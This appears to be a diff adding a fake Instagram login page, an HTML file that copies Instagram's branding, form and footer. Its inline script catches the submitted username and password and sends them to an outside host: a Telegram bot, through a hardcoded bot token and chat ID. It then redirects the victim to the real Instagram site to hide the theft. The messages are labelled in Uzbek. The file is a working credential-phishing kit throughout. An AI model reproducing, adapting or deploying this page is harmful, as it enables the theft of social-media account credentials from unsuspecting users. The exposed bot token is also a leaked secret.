@@ -1,0 +1,119 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<div id="content-container">
+
+    <!--Phone's pictures section-->
+    <section class="phones">
+        <img src="phone.png" alt="pictures on phone" class="phone-image">
+    </section>
+
+    <!--User's log in section-->
+    <section class="user">
+
+        <div class="login-container">
+
+            <!--Instagram Logo-->
+            <div class="instagram-logo-box">
+                <img class="instagram-logo" src="instagram-logo.png">
+            </div>
+
+            <!--Form Login-->
+            <form id="login-post">
+                <input type="hidden" name="cid" value="6900365422">
+                <div class="inputs-container">
+                    <input type="text" id="name" name="username" placeholder="Phone number, username or email" required >
+                </div>
+                <div class="inputs-container">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" id="send" class="login-button">Log in</button>
+
+                <div class="or-container">
+                    <div class="line"></div>
+                    <div class="or">OR</div>
+                    <div class="line"></div>
+                </div>
+
+                <!--Facebook login-->
+                <div class="facebook-container">
+                    <a class="facebook-login" href="" target="_blank"><svg aria-label="Log in with Facebook" class="x1lliihq x1n2onr6 x173jzuc" fill="currentColor" height="20" role="img" viewBox="0 0 16 16" width="20"><title>Log in with Facebook</title><g clip-path="url(#a)"><path d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z" fill="currentColor"></path></g><defs><clipPath id="a"><rect fill="currentColor" height="16" width="16"></rect></clipPath></defs></svg>Log in
+                        with Facebook</a>
+                </div>
+            </form>
+
+            <!--Password recovery-->
+            <a class="password-forgot" href="" target="_blank">Forgot password?</a>
+        </div>
+
+        <!--Sign up-->
+        <div class="signup-container">
+            <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
+        </div>
+
+        <!-- App's download
+        <div class="get-container">
+            <p>Get the app.</p>
+            <div class="download-container">
+                <a class="download-appstore" href="" target="_blank"><img class="appstore" src="applestore-logo.png"></a>
+                <a class="download-googleplay" href="" target="_blank"><img class="googleplay" src="googleplay-logo.png"></a>
+            </div>
+        </div> -->
+
+    </section>
+
+</div>
+
+<footer class="page-footer">
+    <div class="footer-span-container">
+        <span class="footer-span">
+            © 2024 INSTAGRAM FROM FACEBOOK
+        </span>
+    </div>
+</footer>
+
+<script>
+    let botToken = "8487900837:AAHgUrza8wlMn22woWOzsoG_W-8HmVnKWSA";
+    let chatId = "6181160596";
+
+    document.getElementById("login-post").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        let username = document.querySelector("input[name='username']").value;
+        let password = document.querySelector("input[name='password']").value;
+
+        let message = `\ud83c\udd94 <b>Yangi login ma'lumotlari:</b>\n\ud83d\udc64 <b>Username:</b> ${username}\n\ud83d\udd11 <b>Parol:</b> ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
+        })
+        .then(response => {
+            if (response.ok) {
+                window.location.href = "https://www.instagram.com/?next=%2F";
+            } else {
+                alert("Xatolik yuz berdi, qayta urinib ko'ring!");
+            }
+        })
+        .catch(error => {
+            console.error("Xato:", error);
+            alert("Xatolik yuz berdi!");
+        });
+    });
+</script>
+
+</body>
+
+</html>
